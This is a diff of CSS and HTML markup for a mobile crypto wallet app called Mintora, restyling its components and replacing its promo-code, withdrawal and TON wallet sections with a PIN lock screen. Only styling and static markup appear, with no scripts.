   .btn-secondary:hover { background: var(--surface-3); }
@@ -462,14 +997,12 @@
   .btn-secondary svg { width: 14px; height: 14px; }
 
   .btn-spinner {
-    width: 15px;
-    height: 15px;
+    width: 15px; height: 15px;
     border: 1.5px solid currentColor;
     border-right-color: transparent;
     border-radius: 50%;
     animation: spin 0.7s linear infinite;
-    display: none;
-    opacity: 0.6;
+    display: none; opacity: 0.6;
   }
 
   .btn-primary.loading .btn-spinner { display: block; }
@@ -477,120 +1010,146 @@
 
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* ============ FEEDBACK ============ */
   .feedback {
-    font-size: 13px;
-    font-weight: 600;
-    padding: 0 4px 10px;
-    min-height: 0;
+    font-size: 13px; font-weight: 600;
+    padding: 10px 4px; min-height: 0;
     letter-spacing: -0.005em;
+    text-align: center;
   }
 
   .feedback.error { color: var(--red); }
   .feedback.success { color: var(--blue); }
   .feedback:empty { display: none; }
 
-  /* ============ NOTICE ============ */
   .notice {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
+    display: flex; align-items: flex-start; gap: 10px;
     padding: 14px 16px;
-    background: var(--surface-2);
-    border: 1px solid var(--line);
+    background: var(--surface-2); border: 1px solid var(--line);
     border-radius: var(--radius-card);
-    font-size: 13px;
-    color: var(--text-2);
-    line-height: 1.5;
-    margin-bottom: 12px;
-    letter-spacing: -0.005em;
-    font-weight: 500;
+    font-size: 13px; color: var(--text-2);
+    line-height: 1.5; margin-bottom: 12px;
+    letter-spacing: -0.005em; font-weight: 500;
   }
 
   .notice svg {
-    width: 16px;
-    height: 16px;
-    color: var(--text-3);
+    width: 16px; height: 16px;
+    color: var(--text-3); flex-shrink: 0; margin-top: 1px;
+  }
+
+  .notice.warn {
+    background: var(--orange-soft);
+    border-color: rgba(245, 158, 11, 0.25);
+    color: var(--orange);
+    font-weight: 600;
+  }
+
+  .notice.warn svg { color: var(--orange); }
+
+  .notice.danger {
+    background: var(--red-soft);
+    border-color: rgba(229, 72, 77, 0.25);
+    color: var(--red);
+    font-weight: 600;
+  }
+
+  .notice.danger svg { color: var(--red); }
+
+  .check-row {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    border-bottom: 1px solid var(--line);
+    transition: background 0.15s;
+  }
+
+  .check-row:last-child { border-bottom: none; }
+  .check-row:hover { background: var(--surface-2); }
+
+  .check-box {
+    width: 22px; height: 22px;
+    border-radius: 7px;
+    border: 1.5px solid var(--line-2);
+    background: var(--surface-2);
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
+    transition: all 0.15s;
     margin-top: 1px;
   }
 
-  /* ============ PROFILE ============ */
+  .check-box svg {
+    width: 12px; height: 12px;
+    color: #fff;
+    opacity: 0;
+    transition: opacity 0.15s;
+  }
+
+  .check-row.checked .check-box {
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    border-color: var(--blue);
+  }
+
+  .check-row.checked .check-box svg { opacity: 1; }
+
+  .check-text {
+    font-size: 13px;
+    color: var(--text-2);
+    line-height: 1.45;
+    font-weight: 500;
+    letter-spacing: -0.005em;
+  }
+
+  .check-text strong { color: var(--text); font-weight: 600; }
+
   .profile-head {
-    display: flex;
-    align-items: center;
-    gap: 14px;
+    display: flex; align-items: center; gap: 14px;
     padding: 20px 18px;
     border-bottom: 1px solid var(--line);
   }
 
   .avatar {
-    width: 56px;
-    height: 56px;
-    border-radius: 50%;
-    background: var(--text);
-    color: var(--bg);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: -0.02em;
-    flex-shrink: 0;
+    width: 56px; height: 56px; border-radius: 50%;
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    color: #ffffff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px; font-weight: 800;
+    letter-spacing: -0.02em; flex-shrink: 0;
+    box-shadow: 0 6px 18px var(--blue-ring);
   }
 
   .profile-meta { flex: 1; min-width: 0; }
 
   .profile-name {
-    font-size: 17px;
-    font-weight: 700;
-    color: var(--text);
-    letter-spacing: -0.02em;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
+    font-size: 17px; font-weight: 700;
+    color: var(--text); letter-spacing: -0.02em;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
   }
 
   .profile-id {
-    font-size: 12px;
-    color: var(--text-3);
-    margin-top: 3px;
-    font-variant-numeric: tabular-nums;
-    font-family: var(--mono);
-    font-weight: 500;
+    font-size: 12px; color: var(--text-3);
+    margin-top: 3px; font-variant-numeric: tabular-nums;
+    font-family: var(--mono); font-weight: 500;
   }
 
-  /* ============ WALLET ============ */
   .wallet-off {
     padding: 18px;
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
+    display: flex; flex-direction: column; gap: 12px;
   }
 
   .wallet-off-text {
-    font-size: 13px;
-    color: var(--text-2);
-    line-height: 1.5;
-    letter-spacing: -0.005em;
+    font-size: 13px; color: var(--text-2);
+    line-height: 1.5; letter-spacing: -0.005em;
   }
 
   .wallet-on { display: none; }
   .wallet-on.show { display: block; }
 
   .copy-btn {
-    width: 36px;
-    height: 36px;
-    border: none;
-    background: var(--surface-2);
-    color: var(--text-3);
-    border-radius: 11px;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    transition: all 0.15s;
+    width: 36px; height: 36px;
+    border: none; background: var(--surface-2); color: var(--text-3);
+    border-radius: 11px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; transition: all 0.15s;
   }
 
   .copy-btn:hover { background: var(--surface-3); color: var(--text); }
@@ -598,45 +1157,31 @@
   .copy-btn svg { width: 14px; height: 14px; }
   .copy-btn.ok { color: var(--blue); background: var(--blue-soft); }
 
-  /* ============ PILL INFO ============ */
   .pill-info {
-    display: none;
-    align-items: center;
-    gap: 9px;
+    display: none; align-items: center; gap: 9px;
     padding: 13px 16px;
-    background: var(--surface);
-    border: 1px solid var(--line);
+    background: var(--surface); border: 1px solid var(--line);
     border-radius: var(--radius-card);
     margin-bottom: 12px;
-    font-size: 13px;
-    color: var(--text);
-    font-weight: 600;
+    font-size: 13px; color: var(--text); font-weight: 600;
   }
 
   .pill-info.show { display: flex; }
 
   .pill-info .dot {
-    width: 7px;
-    height: 7px;
-    border-radius: 50%;
-    background: var(--blue);
-    flex-shrink: 0;
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--blue); flex-shrink: 0;
     box-shadow: 0 0 0 3px var(--blue-ring);
   }
 
   .pill-info .addr {
     margin-left: auto;
-    font-family: var(--mono);
-    font-size: 11px;
-    color: var(--text-3);
-    letter-spacing: -0.01em;
-    font-weight: 500;
+    font-family: var(--mono); font-size: 11px;
+    color: var(--text-3); letter-spacing: -0.01em; font-weight: 500;
   }
 
-  /* ============ PROCESSING ============ */
   .processing {
-    display: none;
-    padding: 32px 20px;
+    display: none; padding: 32px 20px;
     flex-direction: column;
   }
 
@@ -649,88 +1194,63 @@
   }
 
   .proc-eyebrow {
-    font-size: 12px;
-    color: var(--text-3);
-    font-weight: 700;
-    margin-bottom: 10px;
-    letter-spacing: 0.04em;
+    font-size: 12px; color: var(--text-3); font-weight: 700;
+    margin-bottom: 10px; letter-spacing: 0.04em;
     text-transform: uppercase;
   }
 
   .proc-amount {
-    font-size: 40px;
-    font-weight: 800;
-    letter-spacing: -0.04em;
-    color: var(--text);
-    font-variant-numeric: tabular-nums;
-    line-height: 1.05;
+    font-size: 40px; font-weight: 800;
+    letter-spacing: -0.04em; color: var(--text);
+    font-variant-numeric: tabular-nums; line-height: 1.05;
   }
 
   .proc-amount .unit {
-    font-size: 18px;
-    font-weight: 700;
-    color: var(--text-2);
-    margin-left: 8px;
+    font-size: 18px; font-weight: 700;
+    color: var(--text-2); margin-left: 8px;
   }
 
   .progress-rail {
-    height: 6px;
-    background: var(--surface-2);
-    border-radius: 3px;
-    overflow: hidden;
-    margin-bottom: 8px;
+    height: 6px; background: var(--surface-2);
+    border-radius: 3px; overflow: hidden; margin-bottom: 8px;
   }
 
   .progress-fill {
     height: 100%;
-    background: var(--blue);
-    width: 0%;
-    transition: width 1s linear;
+    background: linear-gradient(90deg, var(--blue-2), var(--blue));
+    width: 0%; transition: width 1s linear;
     border-radius: 3px;
   }
 
   .progress-meta {
-    display: flex;
-    justify-content: space-between;
-    font-size: 12px;
-    color: var(--text-3);
+    display: flex; justify-content: space-between;
+    font-size: 12px; color: var(--text-3);
     font-variant-numeric: tabular-nums;
-    margin-bottom: 26px;
-    font-weight: 600;
+    margin-bottom: 26px; font-weight: 600;
   }
 
   .kv {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 14px 0;
-    font-size: 13px;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 0; font-size: 13px;
     border-bottom: 1px solid var(--line);
   }
 
   .kv:last-child { border-bottom: none; }
-
   .kv-k { color: var(--text-3); font-weight: 600; }
-
   .kv-v {
-    color: var(--text);
-    font-weight: 700;
+    color: var(--text); font-weight: 700;
     font-variant-numeric: tabular-nums;
     letter-spacing: -0.01em;
   }
 
   .kv-v.mono {
-    font-family: var(--mono);
-    font-size: 12px;
-    font-weight: 500;
+    font-family: var(--mono); font-size: 12px; font-weight: 500;
   }
 
   .kv-v.blue { color: var(--blue); }
 
-  /* ============ RECEIPT ============ */
   .receipt {
-    display: none;
-    padding: 32px 20px;
+    display: none; padding: 32px 20px;
     flex-direction: column;
   }
 
@@ -743,133 +1263,143 @@
   }
 
   .receipt-status {
-    display: inline-flex;
-    align-items: center;
-    gap: 7px;
+    display: inline-flex; align-items: center; gap: 7px;
     padding: 6px 12px;
-    background: var(--surface-2);
-    color: var(--text);
+    background: var(--green-soft); color: var(--green);
     border-radius: var(--radius-pill);
-    font-size: 11px;
-    font-weight: 800;
-    letter-spacing: 0.04em;
-    text-transform: uppercase;
+    font-size: 11px; font-weight: 800;
+    letter-spacing: 0.04em; text-transform: uppercase;
     margin-bottom: 16px;
-    border: 1px solid var(--line);
+    border: 1px solid rgba(48, 209, 88, 0.25);
   }
 
   .receipt-status .dot {
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: var(--blue);
-    box-shadow: 0 0 0 3px var(--blue-ring);
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 3px rgba(48, 209, 88, 0.2);
   }
 
   .receipt-title {
-    font-size: 30px;
-    font-weight: 800;
-    letter-spacing: -0.04em;
-    color: var(--text);
+    font-size: 30px; font-weight: 800;
+    letter-spacing: -0.04em; color: var(--text);
     line-height: 1.15;
   }
 
   .receipt-sub {
-    font-size: 13px;
-    color: var(--text-2);
-    margin-top: 6px;
-    font-weight: 500;
+    font-size: 13px; color: var(--text-2);
+    margin-top: 6px; font-weight: 500;
   }
 
   .receipt-actions {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-    margin-top: 18px;
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 10px; margin-top: 18px;
   }
 
   .receipt-actions .btn-secondary { margin-top: 0; }
 
-  /* ============ BOTTOM NAV ============ */
+  .verifying {
+    display: none; padding: 80px 20px;
+    flex-direction: column; align-items: center;
+    text-align: center;
+  }
+
+  .verifying.active { display: flex; }
+
+  .verifying-ring {
+    width: 72px; height: 72px;
+    border-radius: 50%;
+    border: 3px solid var(--surface-2);
+    border-top-color: var(--blue);
+    animation: spin 1s linear infinite;
+    margin-bottom: 24px;
+  }
+
+  .verifying-title {
+    font-size: 18px; font-weight: 700;
+    color: var(--text); margin-bottom: 8px;
+    letter-spacing: -0.02em;
+  }
+
+  .verifying-sub {
+    font-size: 13px; color: var(--text-2);
+    max-width: 280px;
+    line-height: 1.55;
+  }
+
   .bottom-nav-wrap {
-    position: fixed;
-    bottom: 0;
-    left: 50%;
+    position: fixed; bottom: 0; left: 50%;
     transform: translateX(-50%);
-    width: 100%;
-    max-width: 420px;
+    width: 100%; max-width: 420px;
     padding: 0 16px 16px;
-    z-index: 100;
-    pointer-events: none;
+    z-index: 100; pointer-events: none;
   }
 
   .bottom-nav {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
+    position: relative;
+    display: flex; align-items: center;
     padding: 6px;
     background: var(--glass-bg);
-    -webkit-backdrop-filter: blur(28px) saturate(180%);
-    backdrop-filter: blur(28px) saturate(180%);
+    -webkit-backdrop-filter: blur(30px) saturate(200%);
+    backdrop-filter: blur(30px) saturate(200%);
     border: 1px solid var(--glass-border);
     border-radius: 100px;
     box-shadow: var(--glass-shadow);
     pointer-events: auto;
+    touch-action: none;
+    user-select: none;
+    overflow: hidden;
+  }
+
+  .nav-pill {
+    position: absolute;
+    top: 6px; bottom: 6px;
+    left: 6px;
+    width: calc((100% - 12px) / 3);
+    background: linear-gradient(180deg, var(--blue-2), var(--blue));
+    border-radius: 100px;
+    transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+    box-shadow:
+      0 6px 18px var(--blue-ring),
+      inset 0 1px 0 rgba(255, 255, 255, 0.25);
+    pointer-events: none;
+    z-index: 0;
+    will-change: transform;
+  }
+
+  .nav-pill.dragging {
+    transition: none;
+    box-shadow:
+      0 10px 28px var(--blue-ring),
+      inset 0 1px 0 rgba(255, 255, 255, 0.25);
   }
 
   .nav-btn {
     flex: 1;
+    position: relative;
+    z-index: 1;
     border: none;
     background: transparent;
     padding: 10px 8px;
     cursor: pointer;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 4px;
+    display: flex; flex-direction: column; align-items: center; gap: 4px;
     color: var(--text-2);
-    font-family: inherit;
-    font-size: 10px;
-    font-weight: 700;
+    font-family: inherit; font-size: 10px; font-weight: 700;
     letter-spacing: 0.02em;
-    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    transition: color 0.3s cubic-bezier(0.4, 0, 0.2, 1);
     border-radius: 100px;
-    position: relative;
-    overflow: hidden;
   }
 
   .nav-btn .nav-icon {
-    width: 24px;
-    height: 24px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    width: 24px; height: 24px;
+    display: flex; align-items: center; justify-content: center;
     transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    position: relative;
-    z-index: 1;
   }
 
   .nav-btn .nav-icon svg { width: 22px; height: 22px; }
 
-  .nav-btn span {
-    position: relative;
-    z-index: 1;
-    transition: color 0.25s;
-  }
+  .nav-btn.active { color: #ffffff; }
+  .nav-btn.active .nav-icon { transform: scale(1.06); }
 
-  .nav-btn.active {
-    color: #ffffff;
-    background: var(--text);
-  }
-
-  [data-theme="dark"] .nav-btn.active {
-    color: #000000;
-    background: #f5f5f7;
-  }
-
-  .nav-btn.active .nav-icon { transform: scale(1.08); }
-
-  /* ============ FOOTER ============ */
   .footer {
     margin-top: auto;
     padding: 24px 20px 8px;
@@ -879,422 +1409,691 @@
     letter-spacing: 0.02em;
     font-weight: 500;
   }
+
+  .footer a {
+    color: var(--text-2);
+    text-decoration: none;
+    border-bottom: 1px solid var(--line-2);
+  }
+
+  .btn-logout {
+    width: 100%;
+    padding: 15px;
+    background: transparent;
+    border: none;
+    color: var(--red);
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    border-radius: var(--radius-control);
+    transition: background 0.15s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 12px;
+    letter-spacing: -0.01em;
+  }
+
+  .btn-logout:hover { background: var(--red-soft); }
+  .btn-logout:active { transform: scale(0.985); }
+  .btn-logout svg { width: 15px; height: 15px; }
 </style>
 </head>
 <body>
 
-<div class="app">
+<!-- ============ LOCK SCREEN ============ -->
+<div class="lock-screen" id="lock-screen">
+  <div class="lock-logo">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 3 L20 9 L12 21 L4 9 Z" stroke="#ffffff" stroke-width="2" stroke-linejoin="round" fill="none"/>
+      <path d="M4 9 H20" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <div class="lock-title" id="lock-title">Welcome back</div>
+  <div class="lock-sub" id="lock-sub">Enter your PIN to unlock Mintora</div>
 
-  <div class="topbar">
-    <div class="brand">
-      <div class="brand-mark">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 3 L20 9 L12 21 L4 9 Z" stroke="var(--bg)" stroke-width="2" stroke-linejoin="round" fill="none"/>
-          <path d="M4 9 H20" stroke="var(--bg)" stroke-width="2" stroke-linecap="round"/>
-        </svg>
-      </div>
-      <span class="brand-name">Mintora</span>
-    </div>
-
-    <div class="glass-controls">
-      <button class="glass-btn" id="theme-toggle" aria-label="Theme">
-        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M21 12.8 A9 9 0 1 1 11.2 3 a7 7 0 0 0 9.8 9.8 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-        </svg>
-        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none">
-          <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.8"/>
-          <path d="M12 3 V5 M12 19 V21 M3 12 H5 M19 12 H21 M5.6 5.6 L7 7 M17 17 L18.4 18.4 M5.6 18.4 L7 17 M17 7 L18.4 5.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-        </svg>
-      </button>
-      <div class="glass-divider"></div>
-      <button class="glass-btn" id="lang-toggle"><span id="lang-label">EN</span></button>
-    </div>
+  <div class="lock-dots" id="lock-dots">
+    <div class="lock-dot"></div>
+    <div class="lock-dot"></div>
+    <div class="lock-dot"></div>
+    <div class="lock-dot"></div>
   </div>
 
-  <div class="balance-hero" id="balance-hero">
-    <div class="balance-eyebrow" data-i18n="balanceLabel">Total balance</div>
-    <div class="balance-num-row">
-      <span class="balance-num" id="balance-amount">0</span>
-      <span class="balance-unit">GRAM</span>
-    </div>
-    <div class="balance-usd-row">
-      <span>≈ $<span id="balance-usd">0.00</span> USD</span>
-      <span class="balance-pill" id="balance-badge" style="display:none">
-        <span class="dot"></span>
-        <span data-i18n="badgeActive">Active</span>
-      </span>
-    </div>
+  <div class="lock-keypad" id="lock-keypad">
+    <button class="lock-key" data-key="1">1</button>
+    <button class="lock-key" data-key="2">2</button>
+    <button class="lock-key" data-key="3">3</button>
+    <button class="lock-key" data-key="4">4</button>
+    <button class="lock-key" data-key="5">5</button>
+    <button class="lock-key" data-key="6">6</button>
+    <button class="lock-key" data-key="7">7</button>
+    <button class="lock-key" data-key="8">8</button>
+    <button class="lock-key" data-key="9">9</button>
+    <button class="lock-key empty"></button>
+    <button class="lock-key" data-key="0">0</button>
+    <button class="lock-key icon" id="lock-delete">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M21 6 H9 l-6 6 l6 6 h12 a1 1 0 0 0 1-1 V7 a1 1 0 0 0-1-1 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+        <path d="M17 10 L13 14 M13 10 L17 14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+      </svg>
+    </button>
   </div>
 
-  <div id="main-view">
+  <div class="lock-error" id="lock-error"></div>
 
-    <!-- PROMO -->
-    <div class="section active" id="section-promo">
-      <div class="card">
-        <div class="field">
-          <div class="row-icon blue">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M3 9 V7 a2 2 0 0 1 2-2 H19 a2 2 0 0 1 2 2 V9 a3 3 0 0 0 0 6 V17 a2 2 0 0 1-2 2 H5 a2 2 0 0 1-2-2 V15 a3 3 0 0 0 0-6 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-              <path d="M14 6 V9 M14 12 V15 M14 18 V20" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="0.1 3"/>
-            </svg>
-          </div>
-          <input type="text" class="field-input code" id="promo-input" placeholder="— — — — — —" maxlength="12" autocomplete="off" spellcheck="false" />
-        </div>
-      </div>
-      <div class="feedback" id="promo-status"></div>
-
-      <button class="btn-primary accent" id="promo-submit">
-        <span class="btn-spinner"></span>
-        <span data-i18n="promoBtn">Activate code</span>
-      </button>
-
-      <div class="card" id="promo-history-card" style="display:none; margin-top: 14px;">
-        <div class="card-row" style="cursor:pointer" id="promo-history-toggle">
-          <div class="row-icon blue">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M3 12 a9 9 0 1 0 3-6.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-              <path d="M3 4 V9 H8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-              <path d="M12 8 V12.5 L15 14.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-label" data-i18n="historyLabel">Activated codes</div>
-            <div class="row-value"><span id="history-count">0</span> <span style="color:var(--text-3); font-weight:500" data-i18n="historyCountLabel">codes</span></div>
-          </div>
-          <svg class="row-chevron" id="history-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
-        <div id="promo-history-list" style="display:none;"></div>
-      </div>
-    </div>
-
-    <!-- WITHDRAW -->
-    <div class="section" id="section-withdraw">
-      <div class="notice" id="locked-notice" style="display:none">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.8"/>
-          <path d="M8 11 V7 a4 4 0 0 1 8 0 V11" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-        </svg>
-        <span data-i18n="lockedHint">Enter your promo code first to unlock withdrawals.</span>
-      </div>
-
-      <div class="pill-info" id="wallet-pill">
-        <span class="dot"></span>
-        <span data-i18n="walletConnected">Wallet connected</span>
-        <span class="addr" id="pill-addr">—</span>
-      </div>
-
-      <div class="card">
-        <div class="field">
-          <div class="row-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="12" cy="12" r="8.5" stroke="currentColor" stroke-width="1.8"/>
-              <path d="M12 7 V12 L15 14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <input type="number" class="field-input" id="withdraw-input" placeholder="0" min="0" step="0.01" autocomplete="off" />
-          <span class="field-suffix">GRAM</span>
-          <span class="field-suffix max" id="max-btn" data-i18n="maxBtn">MAX</span>
-        </div>
-      </div>
-      <div class="feedback" id="withdraw-status"></div>
-
-      <button class="btn-primary accent" id="withdraw-btn">
-        <span class="btn-spinner"></span>
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 15 V3 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M4 15 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-        </svg>
-        <span id="withdraw-btn-text" data-i18n="connectBtn">Connect wallet</span>
-      </button>
-    </div>
-
-    <!-- PROFILE -->
-    <div class="section" id="section-profile">
-      <div class="card">
-        <div class="profile-head">
-          <div class="avatar" id="profile-avatar">U</div>
-          <div class="profile-meta">
-            <div class="profile-name" id="profile-name">Guest</div>
-            <div class="profile-id" id="profile-id">ID: —</div>
-          </div>
-        </div>
-        <div class="card-row">
-          <div class="row-icon blue">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 2 V22 M17 6 H9.5 a3.5 3.5 0 0 0 0 7 H14.5 a3.5 3.5 0 0 1 0 7 H7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-label" data-i18n="statBalance">Balance</div>
-            <div class="row-value"><span id="stat-balance">0</span> GRAM</div>
-          </div>
-        </div>
-        <div class="card-row">
-          <div class="row-icon" id="status-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
-              <path d="M12 8 V12.5 L15 14.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-label" data-i18n="statStatus">Status</div>
-            <div class="row-value" id="stat-status" data-i18n="statusGuest">Guest</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-row">
-          <div class="row-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <rect x="3" y="6" width="18" height="13" rx="3" stroke="currentColor" stroke-width="1.8"/>
-              <path d="M3 10 H21" stroke="currentColor" stroke-width="1.8"/>
-              <circle cx="16.5" cy="14.5" r="1.2" fill="currentColor"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-value" data-i18n="walletLabel">TON Wallet</div>
-          </div>
-        </div>
-
-        <div class="wallet-off" id="wallet-off">
-          <div class="wallet-off-text" data-i18n="walletNotConnectedText">Connect your TON wallet to receive payouts and manage withdrawals.</div>
-          <button class="btn-primary" id="profile-connect-btn">
-            <span class="btn-spinner"></span>
-            <svg class="btn-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M10 13 a5 5 0 0 0 7.54.54 l3-3 a5 5 0 0 0-7.07-7.07 l-1.72 1.71" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
-              <path d="M14 11 a5 5 0 0 0-7.54-.54 l-3 3 a5 5 0 0 0 7.07 7.07 l1.71-1.71" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-            <span data-i18n="connectBtn">Connect wallet</span>
-          </button>
-        </div>
-
-        <div class="wallet-on" id="wallet-on">
-          <div class="card-row">
-            <div class="row-icon blue">
-              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
-                <path d="M3.5 12 H20.5 M12 3 a15 15 0 0 1 0 18 a15 15 0 0 1 0-18 Z" stroke="currentColor" stroke-width="1.8"/>
-              </svg>
-            </div>
-            <div class="row-body">
-              <div class="row-label" data-i18n="walletAddress">Address</div>
-              <div class="row-value mono" id="profile-wallet-addr">—</div>
-            </div>
-            <button class="copy-btn" id="copy-addr">
-              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="8" y="8" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.8"/>
-                <path d="M16 8 V6 a2 2 0 0 0-2-2 H6 a2 2 0 0 0-2 2 v8 a2 2 0 0 0 2 2 h2" stroke="currentColor" stroke-width="1.8"/>
-              </svg>
-            </button>
-          </div>
-          <div class="card-row">
-            <div class="row-icon green">
-              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 3 L4 6.5 V12 c0 4.5 3.4 7.7 8 9 c4.6-1.3 8-4.5 8-9 V6.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-                <path d="M9 12 L11 14 L15 9.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-              </svg>
-            </div>
-            <div class="row-body">
-              <div class="row-label" data-i18n="walletNetwork">Network</div>
-              <div class="row-value muted">TON Mainnet</div>
-            </div>
-          </div>
-          <div class="card-row" id="disconnect-btn" style="cursor:pointer">
-            <div class="row-icon red">
-              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M10 17 L5 12 L10 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M5 12 H15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-                <path d="M15 5 H19 a2 2 0 0 1 2 2 V17 a2 2 0 0 1-2 2 H15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-              </svg>
-            </div>
-            <div class="row-body">
-              <div class="row-value" style="color:var(--red)" data-i18n="disconnectBtn">Disconnect wallet</div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-row" style="cursor:pointer" id="menu-support">
-          <div class="row-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
-              <path d="M9.5 9.5 a2.5 2.5 0 1 1 3.5 2.3 c-0.7 0.3-1 0.7-1 1.4 V14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-              <circle cx="12" cy="17" r="0.9" fill="currentColor"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-value" data-i18n="menuSupport">Support</div>
-          </div>
-          <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
